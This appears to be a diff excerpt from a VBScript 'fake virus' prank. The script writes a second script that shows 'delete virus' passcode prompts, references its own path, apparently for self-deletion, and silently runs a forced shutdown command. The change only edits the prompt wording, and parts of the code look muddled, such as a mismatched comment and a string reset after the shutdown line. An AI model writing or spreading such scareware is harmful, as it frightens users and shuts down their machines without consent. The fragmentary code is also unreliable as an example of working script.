@@ -14,7 +14,7 @@ Dim id, ans
 
 ' Simulate pressing a random key every 10 seconds
 strScriptContents = "Dim passcode"
-strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus from registry"")"
+strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus"")"
 strScriptContents = strScriptContents & vbCrLf & "If passcode = ""1234"" Then"
 strScriptContents = strScriptContents & vbCrLf & "    Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
 strScriptContents = strScriptContents & vbCrLf & "    strScriptPath = WScript.ScriptFullName"
@@ -40,7 +40,7 @@ objFile.Close
 ' Define the content for the new script with message box and deletion option
 strScriptContents = strScriptContents & vbCrLf & "    objShell.Run ""shutdown.exe -s -t 840"", 0, True"
 strScriptContents = "Dim passcode"
-strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus from sytem32"")"
+strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus2"")"
 strScriptContents = strScriptContents & vbCrLf & "If passcode = ""1234"" Then"
 strScriptContents = strScriptContents & vbCrLf & "    Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
 strScriptContents = strScriptContents & vbCrLf & "    strScriptPath = WScript.ScriptFullName"
